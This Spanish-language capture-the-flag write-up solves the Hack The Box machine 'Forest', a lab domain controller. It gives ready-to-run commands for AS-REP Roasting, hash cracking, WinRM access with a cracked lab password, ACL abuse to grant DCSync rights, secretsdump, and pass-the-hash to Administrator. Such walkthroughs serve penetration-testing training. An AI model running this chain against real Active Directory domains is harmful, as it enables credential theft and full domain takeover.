---
title: Forest - Hack The Box
categories: [Windows, Domain Controller, DC, Active Directory, AD, LDAP, ldapsearch, AS-REP Roasting, Kerberos, GetNPUsers, Impacket, RPC, rpcclient, John the Ripper, WinRM, Windows Remote Management, CrackMapExec, Evil-WinRM, SharpHound, BloodHound, Account Operators, WriteDacl, DCSync, MS-DRSR, PowerView, PowerSploit, Add-DomainObjectAcl, secretsdump, Pass the Hash, PtH, psexec]
published: true
lang: es
---

El día de hoy vamos a resolver la máquina _Forest_ de _Hack The Box_. Es una máquina _Windows_ de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/1.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Fase De Reconocimiento

Primeramente vamos a lanzar una _traza ICMP_ para saber si la máquina está activa.

```
ping -c 1 10.10.10.161
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/2.png){:class="blog-image" onclick="expandImage(this)"}

Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del _TTL_; en este caso el valor del _TTL_ de la máquina es `127`, por lo que podemos intuir que estamos ante una máquina _Windows_. Recordemos que algunos de los valores referenciales son los siguientes:

| Sistema Operativo (OS) | TTL |
|:-----------------------|:----|
| Linux                  | 64  |
| Windows                | 128 |
| Solaris                | 254 | 

Si nos damos cuenta, en esta ocasión, el valor del _TTL_ es `127` y no `128` como indica la tabla anterior, esto se debe a que en el entorno de máquinas de _Hack The Box_, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el _TTL_ disminuye en una unidad.

```
ping -c 1 10.10.10.161 -R
``` 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3a.png){:class="blog-image" onclick="expandImage(this)"}

Posteriormente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:

```bash
nmap -p- --open -T5 -v -n 10.10.10.161
```

En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161
```

A continuación se explican los parámetros utilizados en el escaneo de puertos con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-p\- | Escanea todo el rango de puertos (65535 en total) |
| \-\-open | Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) |
| \-T5 | La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, "generaremos más ruido", pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos `White Hat` | 
| \-v | _Verbose_, reporta lo encontrado por consola |
| \-n | No aplicar _resolución DNS_ |
| \-sS | Escaneo _TCP SYN_ |
| \-min-rate | Emitir paquetes no más lentos que \<valor\> por segundo |
| \-vvv | Triple _verbose_, para obtener mayor información por consola |
| \-Pn | No aplicar _host discovery_ |

Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.

```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49957 10.10.10.161
```

A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-sC | Scripts básicos de enumeración |
| \-sV | Versión y servicios que corren bajo los puertos encontrados |
| \-p | Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) |

Basándonos en la información que nos reporta _Nmap_, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con `DNS` (53), `Kerberos authentication` (88), `RPC` (135), `NetBIOS` (139), `LDAP` (389), `SMB` (445) y `WinRM` (5985). Por lo que podemos intuir nos estamos enfrentando ante un _Domain Controller (DC)_ y nos encontramos en un entorno de _Active Directory (AD)_.

### [](#header-3)Fase De Explotación

Lo primero que haremos será comprobar si la máquina cuenta con recursos compartidos a nivel de red a través del uso de un _null session_, pues no contamos con credenciales; para ello podemos hacer uso de herramientas como _SMBMap_ o _smbclient_, no obstante, no podremos listar nada.

```bash
smbmap -H 10.10.10.161
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/4.png){:class="blog-image" onclick="expandImage(this)"}

```bash
smbclient -N -L 10.10.10.161
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/5.png){:class="blog-image" onclick="expandImage(this)"}

Lo siguiente que podemos probar es enumerar el protocolo `LDAP` para obtener información sobre usuarios, grupos u otros objetos en el entorno. Para realizar esto, utilizaremos la herramienta `ldapsearch`.

Nuestro primer objetivo será identificar el _Naming Context_, que es el _Distinguished Name (DN)_ que representa el nivel más alto en la jerarquía del _Directory Information Tree (DIT)_ y servirá como base para nuestras consultas. Utilizaremos el siguiente comando:

```bash
ldapsearch -x -h 10.10.10.161 -s base namingcontexts
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/6.png){:class="blog-image" onclick="expandImage(this)"}

El campo _dn_ se encuentra vacío porque estamos consultando el objeto base del directorio. Los campos _namingContexts_ listan los diferentes _Naming Contexts_ del servidor _LDAP_. Cada entrada en _namingContexts_ representa una parte distinta del directorio _LDAP_ que puede ser la base de varias búsquedas.

Utilizaremos `DC=htb,DC=local` como base de nuestras consultas porque este es el _Naming Context_ principal que representa el dominio `htb.local`, incluyendo usuarios, grupos y otros objetos principales. Los demás _Naming Contexts_ (CN=Configuration, CN=Schema, DC=DomainDnsZones, DC=ForestDnsZones) son específicos para configuraciones y esquemas dentro del entorno de _AD_.

Una vez obtenemos el _DN_, podemos empezar a realizar consultas específicas o bien, podríamos listar toda la información del _LDAP_ con el siguiente comando:

```bash
ldapsearch -x -h 10.10.10.161 -b "dc=htb,dc=local"
```

| Parámetro | Explicación |
|:----------|:------------|
| \-x | Simple authentication |
| \-h | Host |
| \-s | Search scope |
| \-b | DN base para la búsqueda |

Podemos comenzar buscando entradas que contengan la clase de objeto _user_ para listar usuarios del sistema.

```bash
ldapsearch -x -h 10.10.10.161 -b "dc=htb,dc=local" '(objectClass=user)'
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/7.png){:class="blog-image" onclick="expandImage(this)"}

En los campos _sAMAccountName_ de cada usuario, encontraremos sus respectivos nombres de usuario. Con un listado potencial de usuarios en nuestro poder, podríamos considerar un ataque `AS-REP Roasting`.

El ataque `AS-REP Roasting` explota una debilidad en la autenticación de `Kerberos` en entornos de _Active Directory_. Este ataque comienza enviando un mensaje de solicitud de _Authentication Server Request (AS-REQ)_ al _DC_ para usuarios que están configurados para no requierer preautenticación de _Kerberos_. Si la cuenta del usuario está configurada de esta manera, el _DC_ nos responderá con un mensaje de _Authentication Server Response (AS-REP)_, que contiene un _Ticket Granting Ticket (TGT)_ emitido por el _Key Distribution Center (KDC)_. Este _TGT_ puede ser vulnerable a ataques de fuerza bruta si la contraseña es débil, permitiéndonos romper la contraseña del usuario sin tener que realizar una autenticación completa. Esta vulnerabilidad se explota debido a que el servidor responde con un mensaje _AS-REP_ en lugar de rechazar la solicitud debido a la falta de preautenticación.

Con esto en mente, en vez de buscar usuario por usuario manualmente, podemos utilizar un one-liner para filtrar y parsear los usuarios directamente.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/8.png){:class="blog-image" onclick="expandImage(this)"}

Podemos refinar aún más la lista de usuarios obtenida para centrarnos exclusivamente en las cuentas relevantes. Las dos primeras cuentas, _DefaultAccount_ y _Guest_, son creadas por el propio _AD_ (aunque _Guest_ no está habilitada por defecto). Las cuentas que terminan en _$_ son cuentas de equipos (_computer accounts_), mientras que la cuenta _$331000-VK4ADACQNUCA_ tiene un formato inusual y podría ser una cuenta de servicio especial o generada automáticamente. Las cuentas que empiezan por _SM\__ y _HealthMailbox_ están relacionadas con el servicio _Microsoft Exchange_. Esto nos deja con cinco usuarios potenciales para nuestro análisis.

Lo siguiente que haremos será utilizar el script `GetNPUsers` de la suite `Impacket`. Para ejecutarlo, necesitamos proporcionar el nombre del dominio del _AD_ al que queremos apuntar. Para configurar esto, editaremos el archivo `/etc/hosts` para asegurarnos de que el nombre de dominio se resuelva a la dirección IP correspondiente del servidor.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/9.png){:class="blog-image" onclick="expandImage(this)"}

Con esto hecho, el comando que utilizaremos es el siguiente:

```bash
impacket-GetNPUsers htb.local/ -no-pass -userfile archivoListadoUsuarios 
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/10.png){:class="blog-image" onclick="expandImage(this)"}

Curiosamente, ninguno de los usuarios que hemos obtenido parece ser vulnerable a `AS-REP Roasting`. Por lo tanto, procederemos a enumerar otro protocolo que hemos identificado durante nuestro escaneo con _Nmap_, `RPC`.

Haremos uso de `rpcclient`, nuevamente utilizando un _null session_, pues no contamos con credenciales. Verificamos que podemos conectarnos exitosamente, por lo que procederemos a enumerar información adicional. Podríamos listar los grupos dentro del dominio mediante _enumdomgroup_ o, alternativamente, volver a listar los usuarios del dominio mediante _enumdomusers_.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/11.png){:class="blog-image" onclick="expandImage(this)"}

Podemos observar tres nuevos usuarios que no habíamos detectado cuando enumeramos con _ldapsearch_. De los cuales nos interesa `svc-alfresco`, pues tanto Administrator como krbtgt son creados por el propio _AD_.

Si recordamos, cuando utilizamos _ldapsearch_, filtramos usuarios cuya clase de objeto contenga _user_, y los cinco usuarios que encontramos anteriormente, cumplen con esta condición.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/12.png){:class="blog-image" onclick="expandImage(this)"}

Sin embargo, al investigar un poco más, descubrimos que este "usuario" `svc-alfresco` no tiene una clase de objeto definida. Esto probablemente se debe a que pertenece a la _Unidad Organizativa (OU)_ de Cuentas de Servicio (Service Accounts).

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/13.png){:class="blog-image" onclick="expandImage(this)"}

Nuevamente, mediante el uso de un one-liner podríamos filtrar y parsear los usuarios, refinar la lista y utilizarla junto a `Impacket` para comprobar si este nuevo usuario es vulnerable a `AS-REP Roasting`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/14.png){:class="blog-image" onclick="expandImage(this)"}

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"}

Descubrimos que `svc-alfresco` es vulnerable a `AS-REP Roasting` y obtenemos un hash que procederemos a intentar romper por fuerza bruta utilizando `John the Ripper` en conjunto con el diccionario [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/tag/data).

En caso de no contar con la herramienta `John the Ripper` instalada, podemos hacer lo siguiente:

```bash
sudo apt install john
```

```bash
john --wordlist=/ruta/del/diccionario/rockyou.txt hash
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/16.png){:class="blog-image" onclick="expandImage(this)"}

Una vez obtenemos la contraseña del usuario `svc-alfresco`, podemos validar la credencial antes de intentar conectarnos a la máquina víctima para asegurarnos de que es correcta. Recordemos que durante nuestro escaneo con _Nmap_, observamos que el servicio `WinRM` (_Windows Remote Management_) está activo en la máquina víctima; este será el protocolo que utilizaremos para la conexión.

Para validar la credencial, emplearemos _CrackMapExec_ con el siguiente comando:

```bash
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"}

Nos damos cuenta de que la credencial no solo es válida, sino también que este usuario pertenece al grupo _Remote Management Users_, ya que vemos junto al nombre de usuario un mensaje que dice _Pwn3d!_. Por lo tanto, podemos conectarnos a la máquina víctima mediante `Evil-WinRM`.

Procederemos a conectarnos de la siguiente manera:

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Escalada De Privilegios

Una vez dentro de la máquina víctima, podemos empezar a recolectar información del _Active Directory_ que nos permita escalar privilegios. Para ello nos ayudaremos de `SharpHound`, un recolector de datos para `BloodHound`, una herramienta que permite analizar y visualizar relaciones y permisos en un entorno de _Active Directory_ para identificar posibles caminos de escalada de privilegios.

Lo primero que haremos será descargar [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1) en nuestro equipo. Algo muy cómodo de `Evil-WinRM` es que nos permite subir y descargar archivos muy fácilmente. Para ello, ejecutaremos el siguiente comando para subir el archivo `SharpHound.ps1` a la máquina víctima:

```bash
upload SharpHound.ps1
```

Una vez subido, importaremos y utilizaremos la función `Invoke-BloodHound` para recolectar toda la información necesaria.

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

Esto generará un archivo comprimido con toda la información del _AD_. Para descargar este archivo a nuestro equipo, utilizaremos el siguiente comando:

```bash
download <timestamp>_BloodHound.zip BloodHound.zip
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"}

Lo siguiente que haremos será importar el archivo comprimido que generó `SharpHound` a `BloodHound`. Para ello, en caso de no contar con la herramienta instalada, podemos hacer lo siguiente:

```bash
sudo apt install neo4j bloodhound
```

_Neo4j_ es la base de datos gráfica que `BloodHound` utiliza. La arrancaremos de la siguiente manera:

```bash
sudo neo4j console
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/20.png){:class="blog-image" onclick="expandImage(this)"}

Nos indicará que nos dirijamos a [http://localhost:7474/](http://localhost:7474/). Para conectarnos a _Neo4j_ por primera vez, las credenciales que introduciremos son las que vienen por defecto:

* Username: neo4j
* Password: neo4j

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png){:class="blog-image" onclick="expandImage(this)"}

A continuación, nos solicitará que cambiemos la contraseña; esta será la que utilizaremos para `BloodHound`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png){:class="blog-image" onclick="expandImage(this)"}

Una vez abramos `BloodHound` y nos logueemos, en la parte derecha veremos una sección que dice _Upload Data_. Aquí es donde subiremos nuestro archivo comprimido.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png){:class="blog-image" onclick="expandImage(this)"}

En la barra de búsqueda en la parte superior izquierda, podemos buscar por el usuario que acabamos de comprometer, `svc-alfresco`. Podemos hacer clic derecho sobre él y seleccionar _Mark User as Owned_.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/24.png){:class="blog-image" onclick="expandImage(this)"}

Si nos dirigimos al apartado _Analysis_, encontraremos una sección _Shortest Paths_. Dentro de esta sección, seleccionamos _Shortest Path from Owned Principals_. Al hacer clic, se desplegará un gráfico que ilustra el mejor camino para convertirnos en administrador del sistema.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/25.png){:class="blog-image" onclick="expandImage(this)"}

Podemos observar que `svc-alfresco` es miembro del grupo _Service Accounts_, el cual es miembro del grupo _Privileged IT Accounts_, que a su vez es miembro del grupo _Account Operators_. Además, el grupo _Account Operators_ tiene permisos _GenericAll_ sobre el grupo _Exchange Windows Permissions_, lo que le da control total sobre este grupo. El grupo _Exchange Windows Permissions_ tiene permisos _WriteDacl_ sobre el dominio, lo que permite modificar la lista de control de acceso discrecional (_DACL_) del dominio.

Vamos por partes, el grupo _Account Operators_ otorga privilegios limitados de creación de cuentas a un usuario. Por lo tanto, el usuario `svc-alfresco` puede crear otras cuentas en el dominio. Por otra parte, el grupo _Account Operators_ tiene permisos _GenericAll_ sobre el grupo _Exchange Windows Permissions_, lo que significa que `svc-alfresco` puede modificar los permisos del grupo _Exchange Windows Permissions_. Finalmente, el grupo _Exchange Windows Permissions_ tiene permisos _WriteDacl_ sobre el dominio. Abusaremos de esto para otorgarnos privilegios de `DCSync`.

El ataque `DCSync` simula el comportamiento de un _Domain Controller_ y solicita a otros _Domain Controllers_ que repliquen información utilizando el protocolo _Directory Replication Service Remote Protocol_ (_MS-DRSR_). Debido a que este protocolo es esencial para el funcionamiento de _Active Directory_, no se lo puede desactivar. Realizando este ataque, podemos replicar la información del dominio y dumpear todos los hashes del mismo.

Dicho todo esto, lo primero que haremos será aprovechar que `svc-alfresco` es miembro del grupo _Account Operators_, y crear un nuevo usuario. Para ello, haremos lo siguiente:

```bash
net user nombreDeUsuario contraseña /add /domain
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/26.png){:class="blog-image" onclick="expandImage(this)"}

Lo siguiente que haremos será añadir el usuario que acabamos de crear al grupo _Exchange Windows Permissions_, aprovechando que `svc-alfresco` tiene control total sobre este grupo:

```powershell
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members "nombreDeUsuario"
```

También vamos a añadir este usuario al grupo _Remote Management Users_ para que pueda conectarse a través de `Evil-WinRM`:

```powershell
Add-ADGroupMember -Identity "Remote Management Users" -Members "nombreDeUsuario"
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/27.png){:class="blog-image" onclick="expandImage(this)"}

Al añadir al usuario al grupo _Remote Management Users_, evitamos el uso de _PSCredentials_, que normalmente se utilizan para ejecutar comandos con las credenciales de otro usuario, las cuales, personalmente, me generaban conflictos con `PowerView`.

A continuación, cerraremos la sesión actual de `Evil-WinRM` y nos conectaremos nuevamente con el usuario recién creado. Una vez conectados como el nuevo usuario, descargaremos en nuestro equipo el script [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), que pertenece a `PowerSploit` (una colección de scripts en PowerShell). Igual que antes, lo subiremos mediante `Evil-WinRM` y posteriormente lo importaremos:

```powershell
upload PowerView.ps1
Import-Module .\PowerView.ps1
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/28.png){:class="blog-image" onclick="expandImage(this)"}

Una vez importado, utilizaremos la función `Add-DomainObjectAcl` para otorgar permisos de `DCsync` a nuestro usuario recién creado:

```bash
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity nombreDeUsuario -Rights DCSync
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/29.png){:class="blog-image" onclick="expandImage(this)"}

Ya con permisos de `DCsync` en nuestro usuario, podemos utilizar `secretsdump`, otro script de la suite `Impacket` que nos permitirá dumpear los hashes de todos los usuarios del dominio:

```bash
impacket-secretsdump htb.local/nombreDeUsuario:contraseña@10.10.10.161
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/30.png){:class="blog-image" onclick="expandImage(this)"}

Finalmente, podemos realizar un ataque de tipo `Pass the Hash`, que consiste en usar el _hash_ que acabamos de conseguir en lugar de la contraseña (que no conocemos) para autenticarnos. Para esto, podríamos utilizar `psexec` (otro script de `Impacket`), o bien, mediante el mismo `Evil-WinRM`:

```bash
evil-winrm -i 10.10.10.161 -u 'Administrator' -H 'HASH'
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"}

```bash
impacket-psexec administrator@10.10.10.161 -hash HASH
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/32.png){:class="blog-image" onclick="expandImage(this)"}
